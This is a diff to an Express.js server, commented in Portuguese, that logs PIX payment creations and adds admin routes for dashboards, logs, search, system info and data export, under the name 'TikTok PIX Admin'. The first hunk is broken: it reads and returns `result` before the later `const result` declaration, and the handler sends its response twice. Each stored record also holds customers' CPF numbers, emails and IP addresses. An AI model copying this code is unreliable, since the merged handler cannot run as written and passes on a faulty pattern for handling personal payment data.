@@ -156,7 +156,38 @@ app.post('/api/pix/create', async (req, res) => {
             });
         }
         
-        // FORMATA RESPOSTA PARA FRONTEND
+        console.log('🎯 PIX gerado com sucesso! ID:', result.transaction.id);
+
+// 📊 REGISTRAR COM DETALHES COMPLETOS
+try {
+    const paymentData = {
+        id: result.transaction.id,
+        transactionId: data.id || result.transaction.id,
+        customerName: customerName.trim(),
+        customerEmail: customerEmail.trim(),
+        customerCpf: cpfClean,
+        amount: 21.67,
+        status: 'pending',
+        pixCode: result.transaction.pix_code || '',
+        pixUrl: result.transaction.pix_url || '',
+        createdAt: new Date().toISOString(),
+        sessionId: req.headers['x-session-id'] || req.ip,
+        userAgent: req.headers['user-agent'] || '',
+        ip: req.ip || req.connection.remoteAddress
+    };
+    
+    // Registrar no sistema
+    const registered = adminSystem.addPayment(paymentData);
+    
+    if (registered) {
+        console.log('✅ LOG: PIX registrado com sucesso!');
+    }
+    
+} catch (error) {
+    console.error('❌ Erro no registro:', error);
+}
+
+res.json(result);
         const result = {
             success: true,
             message: 'PIX gerado com sucesso!',
@@ -652,3 +683,115 @@ try {
 
 // ENVIAR RESPOSTA PARA O FRONTEND
 res.json(result);
+// ========== NOVAS ROTAS PARA LOGS AVANÇADOS ==========
+
+// Dashboard com estatísticas em tempo real
+app.get('/api/admin-system/dashboard', authenticateAdmin, (req, res) => {
+    try {
+        const stats = adminSystem.getStats();
+        const recentPayments = adminSystem.getAllPayments('all', 1, 10).payments;
+        const recentLogs = adminSystem.getLogs('all', 10);
+        const systemInfo = adminSystem.getSystemInfo();
+
+        res.json({
+            success: true,
+            data: {
+                stats: stats,
+                recentPayments: recentPayments,
+                recentLogs: recentLogs,
+                systemInfo: systemInfo,
+                timestamp: new Date().toISOString()
+            }
+        });
+    } catch (error) {
+        console.error('Erro no dashboard:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Logs com filtros
+app.get('/api/admin-system/logs', authenticateAdmin, (req, res) => {
+    try {
+        const filter = req.query.type || 'all';
+        const limit = parseInt(req.query.limit) || 100;
+        const search = req.query.search || '';
+        
+        let logs = adminSystem.getLogs(filter, limit);
+        
+        // Busca em logs se necessário
+        if (search) {
+            const searchLower = search.toLowerCase();
+            logs = logs.filter(log => 
+                log.message.toLowerCase().includes(searchLower) ||
+                (log.data && JSON.stringify(log.data).toLowerCase().includes(searchLower))
+            );
+        }
+
+        res.json({
+            success: true,
+            logs: logs,
+            total: logs.length,
+            filter: filter
+        });
+    } catch (error) {
+        console.error('Erro nos logs:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Busca avançada em pagamentos
+app.get('/api/admin-system/search', authenticateAdmin, (req, res) => {
+    try {
+        const query = req.query.q || '';
+        const results = adminSystem.searchPayments(query);
+        
+        res.json({
+            success: true,
+            results: results,
+            count: results.length
+        });
+    } catch (error) {
+        console.error('Erro na busca:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Informações do sistema
+app.get('/api/admin-system/info', authenticateAdmin, (req, res) => {
+    try {
+        const info = adminSystem.getSystemInfo();
+        
+        res.json({
+            success: true,
+            info: info,
+            server: {
+                name: 'TikTok PIX Admin',
+                version: '2.0.0',
+                environment: process.env.NODE_ENV || 'production',
+                uptime: process.uptime(),
+                nodeVersion: process.version
+            }
+        });
+    } catch (error) {
+        console.error('Erro nas informações:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Exportar dados
+app.get('/api/admin-system/export', authenticateAdmin, (req, res) => {
+    try {
+        const data = adminSystem.exportData();
+        
+        res.json({
+            success: true,
+            data: data,
+            exportedAt: new Date().toISOString(),
+            format: 'json',
+            filename: `tiktok-pix-backup-${new Date().toISOString().split('T')[0]}.json`
+        });
+    } catch (error) {
+        console.error('Erro na exportação:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
